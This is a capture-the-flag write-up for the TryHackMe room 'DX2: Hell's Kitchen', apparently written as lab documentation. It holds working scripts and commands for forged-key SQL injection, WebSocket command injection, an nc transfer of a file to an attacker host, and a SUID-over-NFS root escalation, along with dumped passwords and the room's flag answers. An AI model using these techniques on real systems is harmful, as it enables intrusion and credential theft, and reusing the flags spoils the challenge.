# DX2: Hell's Kitchen - TryHackMe Writeup

- **Room:** DX2: Hell's Kitchen
- **URL:** https://tryhackme.com/room/dx2hellskitchen
- **Difficulty:** Medium/Hard (Premium)
- **Target OS:** Ubuntu 20.04 (focal)
- **Theme:** Deus Ex - infiltrating the NSF (National Secessionist Forces) through the 'Ton Hotel and its associates.

## Flags

| Flag | Value |
|------|-------|
| Web  | `thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}` |
| User | `thm{5b23d1881ee6a6cfac85866b9a4ff941ecd2fa3e}` |
| Root | `thm{7f6b4d8aee9e1677a0db343ace5fff23fc5b5d3b}` |

---

## 0. Executive Summary

The attack chain, end to end:

1. **Recon** reveals two web services: a hotel booking site on port 80 and a webmail portal ("NYCCOM") on port 4346.
2. The booking site exposes an API endpoint, `/api/booking-info`, that accepts a `booking_key` parameter. The key is **Base58-encoded** and decodes to the string `booking_id:<number>`. This value is concatenated into a SQL query, giving a **UNION-based SQL injection** against a SQLite database.
3. The injection dumps an `email_access` table containing webmail credentials (`pdenton:4321chameleon`).
4. Logging into the webmail on port 4346 exposes a **WebSocket** endpoint that passes the browser's timezone string into a shell command (`TZ=<value> date`). This is a **command injection**, yielding remote code execution as the `gilbert` user.
5. A chain of local secrets escalates laterally: `gilbert` -> `sandra` (user flag) -> `jojo`.
6. `jojo` may run `mount.nfs` via `sudo`. Because outbound traffic is restricted to port 443 only, an attacker-hosted **NFS server (NFSv4) is bound to port 443** and exports a directory with `no_root_squash` containing a **root-owned SUID binary**. Mounting this share and executing the SUID binary as root reads `/root/root.txt`.

---

## 1. Enumeration

### 1.1 Port scan

```bash
nmap -sC -sV -p- -T4 --min-rate 2000 <TARGET> -oN dx2_full.nmap
```

Two open ports:

```
80/tcp   open  http
4346/tcp open  http   (NYCCOM webmail portal)
```

### 1.2 Port 80 - The 'Ton Hotel

The homepage is a hotel site. Notable client-side assets and endpoints:

- `/static/check-rooms.js` - fetches `/api/rooms-available` and only shows the booking form when availability is below a threshold.
- `/new-booking` - sets a `BOOKING_KEY` cookie and loads `/static/new-booking.js`.
- `/api/rooms-available` - returns an integer (observed value: `6`).
- `/api/booking-info?booking_key=<key>` - returns booking details as JSON (`room_num`, `days`).

Fetching a booking page:

```bash
curl -s -i http://<TARGET>/new-booking | grep -i set-cookie
# Set-Cookie: BOOKING_KEY=55oYpt6n8TAVgZajNTenMfF43; ...
```

### 1.3 Port 4346 - NYCCOM webmail

A login form that POSTs `user_name` and `pass_word`. Submitting invalid credentials returns "Invalid Credentials", confirming a real authentication backend. This is our eventual foothold, but we need credentials first.

---

## 2. The Booking Key: Base58 + SQL Injection

### 2.1 Understanding the key format

Every issued `BOOKING_KEY` shares a constant 16-character prefix (`55oYpt6n8TAVgZaj`) followed by 9 variable characters. Probing `/api/booking-info` shows an important oracle:

- A validly-structured key that does not exist returns **HTTP 404** ("not found").
- A malformed key (wrong prefix, wrong length, or special characters) returns **HTTP 400** ("bad request").

This behaviour indicates the key is decoded and validated before a database lookup. The constant prefix suggested an encoding where a fixed string is prepended.

### 2.2 Decoding the key

The key alphabet matches the **Base58** alphabet (Bitcoin-style, no `0OIl`). Decoding a full key:

```python
def dec(s, alpha):
    n = 0
    for c in s:
        n = n * len(alpha) + alpha.index(c)
    return n.to_bytes((n.bit_length() + 7) // 8, 'big')

B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
print(dec("55oYpt6n8TAVgZajNUeKYJGLr", B58))
# b'booking_id:6560703'
```

The decoded value is `booking_id:<number>`. The constant prefix was simply the Base58 encoding of the literal `booking_id:`.

### 2.3 Encoding our own payloads

Because we control the plaintext before encoding, we can craft any `booking_id:` value we like:

```python
B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def enc(b):
    if isinstance(b, str):
        b = b.encode()
    n = int.from_bytes(b, 'big')
    s = ""
    while n > 0:
        n, r = divmod(n, 58)
        s = B58[r] + s
    pad = 0
    for c in b:
        if c == 0:
            pad += 1
        else:
            break
    return B58[0] * pad + s

import requests
def query(payload):
    key = enc("booking_id:" + payload)
    r = requests.get("http://<TARGET>/api/booking-info",
                     params={"booking_key": key}, timeout=15)
    return r.status_code, r.text.strip()
```

### 2.4 Confirming the injection

Probing the decoded value inside the query:

- `query("1")` -> `(404, 'not found')` (valid id, no such booking)
- `query("1'")` -> `(400, 'bad request')` (a single quote breaks the SQL string, causing an error)
- `query("1' UNION SELECT '1','2'-- -")` -> `(200, {"room_num":"1","days":"2"})`

The last result is the key finding: a **UNION-based SQL injection** with **two columns** mapped to the JSON fields `room_num` and `days`. Note that `NULL` columns break JSON serialization, so string literals are used instead.

### 2.5 Database fingerprint and enumeration

```python
def ext(a, b="'x'"):
    code, txt = query(f"1' UNION SELECT {a},{b}-- -")
    if code == 200:
        import json
        return json.loads(txt).get("room_num")
    return f"[{code}]"

print(ext("sqlite_version()"))   # 3.42.0  -> SQLite
print(ext("(SELECT group_concat(name,'||') FROM sqlite_master WHERE type='table')"))
```

The schema reveals an `email_access` table with columns `guest_name`, `email_username`, `email_password`.

### 2.6 Dumping credentials

```python
print(ext("(SELECT group_concat(guest_name||' | '||email_username||' | '||email_password, '\n') FROM email_access)"))
```

This yields webmail credentials, including:

```
pdenton | 4321chameleon
```

---

## 3. Webmail Foothold and Command Injection (RCE)

### 3.1 Logging in

```bash
curl -s -i -X POST http://<TARGET>:4346/ \
  --data-urlencode "user_name=pdenton" \
  --data-urlencode "pass_word=4321chameleon"
# 303 redirect to /mail, sets an "id" session cookie
```

The mailbox lists messages loaded from `/api/message?message_id=<n>`. Message bodies are Base64-encoded; decoding them reveals internal correspondence, including the confirmation of the **web flag**.

### 3.2 The WebSocket timezone command injection

The mail interface includes JavaScript that opens a WebSocket to `ws://<TARGET>:4346/ws` and sends the browser's IANA timezone string. The server runs the equivalent of:

```
TZ=<client_supplied_value> date
```

The value is not sanitized, so shell metacharacters allow command injection.

```python
import websocket

ck = "id=<session_cookie>"

def run(cmd):
    ws = websocket.create_connection("ws://<TARGET>:4346/ws",
                                     header=["Cookie: " + ck], timeout=15)
    ws.send(cmd)
    r = ws.recv()
    ws.close()
    return r

print(run("; id ;"))
# uid=1001(gilbert) gid=1001(gilbert) groups=1001(gilbert)
```

We now have **RCE as `gilbert`**.

### 3.3 Constraints of the injection channel

Two important limitations shape the rest of the exploitation:

1. **Input length limit:** the timezone value is capped at roughly **31 characters** total per payload. Longer inputs are rejected with `invalid`. This makes complex one-liners impossible; commands are kept short, or logic is written to files and executed.
2. **Single-threaded handler and fragile state:** the mail service handles one request at a time. If an interactive process started via the WebSocket (for example, a `su` that blocks waiting for a password on a controlling terminal, or a reverse shell whose socket is torn down abruptly) is left hanging, the service **deadlocks and stops responding**. In practice: never run bare `su` over the WebSocket, and always let any spawned shell exit cleanly.

---

## 4. Local Enumeration and Lateral Movement

Because outbound traffic is filtered (see Section 5), a reverse shell is only useful on an allowed port. A convenient approach for enumeration is to run short commands directly through the WebSocket, and for interactive work to use a properly staged reverse shell that is exited cleanly.

### 4.1 gilbert -> secrets

```
; cat /home/gilbert/h* ;        # hotel-jobs note -> gilbert password: ilovemydaughter
; cat /home/gilbert/dad.txt ;   # note from Sandra: "left you a note by the site"
; ls -la /home/sandra ;         # user.txt (sandra), note.txt, Pictures/
```

The "note by the site" refers to the web server directory. Searching there:

```
; ls -la /srv ;                 # reveals /srv/.dad, group-readable by gilbert
; cat /srv/.dad ;               # Sandra's password: anywherebuthere
```

### 4.2 gilbert -> sandra (User flag)

Using a stable interactive shell (PTY), switch to `sandra`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su sandra           # password: anywherebuthere
cat /home/sandra/user.txt
# thm{5b23d1881ee6a6cfac85866b9a4ff941ecd2fa3e}
```

### 4.3 sandra -> jojo

Sandra's `Pictures/` directory (mode `rwx` for sandra only) contains `boss.jpg`. Exfiltrating and viewing it reveals a caption:

```
JoJo Fine: kingofhellskitchen
```

To transfer the binary file reliably (avoiding PTY corruption), it was pushed to the attacker over an allowed port:

```bash
# attacker
nc -lnp 80 > boss.jpg      # or a small python receiver
# target (as sandra)
nc -w3 <ATTACKER> 80 < /home/sandra/Pictures/boss.jpg
```

### 4.4 Confirming jojo and the privilege escalation vector

```bash
su jojo             # password: kingofhellskitchen
sudo -l
# (root) /usr/sbin/mount.nfs
```

`jojo` can run `mount.nfs` as root. This is the path to full root.

---

## 5. Root via NFS no_root_squash

### 5.1 The egress constraint

Testing outbound connectivity from the target shows a strict egress firewall:

```
OUT 80   BLOCKED
OUT 443  OPEN
OUT 2049 BLOCKED   (default NFS port)
```

Only **port 443** is reachable outbound. Therefore the attacker's NFS server must listen on **443**, and the client must be told to use that port.

### 5.2 Why NFSv3 fails and NFSv4 is used

An initial attempt used NFSv3 with the MOUNT protocol forced onto port 443. Even though the server registered both the NFS (100003) and MOUNT (100005) programs with rpcbind, the MOUNT program did not actually answer on the shared port. A local mount test made the failure explicit:

```
mount.nfs: RPC Error: Program unavailable
rpcinfo -T tcp 127.0.0.1 100005 3  ->  Program unavailable
```

**NFSv4 solves this** because it does not use a separate MOUNT protocol; all operations run over the single NFS port. Switching the server to NFSv4-only on port 443 allowed the mount to succeed.

### 5.3 Attacker setup (Kali)

Install a userspace NFS server that can bind to a custom port:

```bash
sudo apt-get install -y nfs-ganesha nfs-ganesha-vfs
sudo mkdir -p /var/run/ganesha /var/lib/nfs/ganesha
sudo systemctl start rpcbind
```

Create the export directory and a **root-owned SUID payload**. A statically linked binary is used to avoid libc-version mismatches between the attacker and target:

```c
/* rootread.c - static SUID helper */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0); setgid(0);
    system("cat /root/root.txt > /tmp/m/rf.txt 2>/dev/null; "
           "id > /tmp/m/idp.txt 2>&1");
    return 0;
}
```

```bash
gcc -static -O2 rootread.c -o rootread
sudo mkdir -p /srv/nfsx
sudo cp rootread /srv/nfsx/rootread
# also stage a SUID shell as a fallback
sudo cp /bin/bash /srv/nfsx/rootbash
sudo chown root:root /srv/nfsx/root*
sudo chmod 4755 /srv/nfsx/rootread /srv/nfsx/rootbash
```

NFS-Ganesha configuration (`ganesha.conf`), NFSv4-only on port 443 with `no_root_squash`:

```
NFS_CORE_PARAM {
    NFS_Port = 443;
    Enable_NLM = false;
    Enable_RQUOTA = false;
    Enable_UDP = false;
    Protocols = 4;
}

NFSV4 {
    Graceless = true;
    Lease_Lifetime = 10;
}

EXPORT {
    Export_Id = 1;
    Path = /srv/nfsx;
    Pseudo = /;
    Access_Type = RW;
    Squash = No_Root_Squash;
    SecType = sys;
    Protocols = 4;
    Transports = TCP;
    FSAL { Name = VFS; }
}

LOG { Default_Log_Level = EVENT; }
```

Start the server and verify locally:

```bash
sudo ganesha.nfsd -f ganesha.conf -L /tmp/ganesha.log -N NIV_EVENT
sudo mount -t nfs4 -o port=443 127.0.0.1:/ /mnt/testx
ls -la /mnt/testx     # shows rootread and rootbash with SUID bit intact
```

### 5.4 Triggering the mount on the target

As `jojo`, mount the attacker share over port 443 and run the SUID payload. The mount must be performed from a stable context; a clean, self-contained script executed as `jojo` works well:

```bash
mkdir -p /tmp/m
sudo /usr/sbin/mount.nfs -o vers=4,port=443 <ATTACKER>:/ /tmp/m
ls -la /tmp/m
# -rwsr-xr-x 1 root root ... rootbash
# -rwsr-xr-x 1 root root ... rootread
/tmp/m/rootread          # runs as root, writes flag into the share
```

Because the export uses `no_root_squash`, the SUID bit is preserved and the binary executes with root privileges. Two equivalent ways to read the flag:

```bash
# via the static helper (writes into the shared dir, read from attacker side)
/tmp/m/rootread

# or directly with the SUID shell
/tmp/m/rootbash -p -c 'cat /root/root.txt'
```

Result:

```
thm{7f6b4d8aee9e1677a0db343ace5fff23fc5b5d3b}
```

The root home listing confirmed full root file access (`root.txt`, `.ssh`, etc.).

---

## 6. Operational Notes and Gotchas

- **Keep WebSocket commands short.** The timezone field enforces a ~31-character limit. Build any non-trivial logic into files on disk, then execute them.
- **Never leave an interactive process hanging on the WebSocket.** A blocking `su` prompt or an abruptly killed reverse shell deadlocks the single-threaded mail service on 4346, which then requires a box reset. Always `exit` shells cleanly.
- **Port juggling on 443.** Both the reverse shell listener and the NFS server need port 443. Sequence the work: stage everything, launch a delayed mount script on the target, exit the shell cleanly, free 443, then start the NFS server before the delayed mount fires.
- **Use NFSv4, not NFSv3.** NFSv4 avoids the separate MOUNT protocol and works cleanly on a single custom port.
- **Prefer a static SUID binary** over a copied dynamic binary to sidestep libc mismatches between attacker and target.

---

## 7. Credentials and Artifacts Reference

| User | Password | Source |
|------|----------|--------|
| pdenton (webmail) | 4321chameleon | SQLi dump of `email_access` |
| gilbert | ilovemydaughter | `/home/gilbert/hotel-jobs.txt` |
| sandra | anywherebuthere | `/srv/.dad` (note by the web root) |
| jojo | kingofhellskitchen | caption in `/home/sandra/Pictures/boss.jpg` |

| Endpoint | Purpose |
|----------|---------|
| `/api/rooms-available` | availability integer (gates booking form) |
| `/api/booking-info?booking_key=` | Base58 key -> `booking_id:<n>` -> SQL injection |
| `/api/message?message_id=` | Base64-encoded webmail messages |
| `ws://<TARGET>:4346/ws` | timezone command injection (RCE) |

---

## 8. Remediation

- **SQL injection:** use parameterized queries; never concatenate decoded values into SQL. Treat the decoded `booking_id` as an integer and bind it.
- **Predictable/forgeable identifiers:** Base58 is an encoding, not a security control. Use unguessable, server-side session-bound tokens for booking lookups and enforce authorization.
- **Command injection:** never pass user-controlled data into a shell. Validate the timezone against a strict allowlist of IANA zone names and avoid invoking a shell entirely.
- **Credential hygiene:** do not store plaintext email passwords in the application database; do not leave passwords in world/group-readable notes or images.
- **Sudo and NFS:** avoid granting `mount.nfs` via sudo. If NFS is required, export with `root_squash` and restrict allowed servers/networks. Restrict outbound egress to prevent attacker-hosted service callbacks.

---

## 9. Flag Summary

```
Web  : thm{adb5b797ee0d01a8c052dbee46fbc065e8c52afd}
User : thm{5b23d1881ee6a6cfac85866b9a4ff941ecd2fa3e}
Root : thm{7f6b4d8aee9e1677a0db343ace5fff23fc5b5d3b}
```
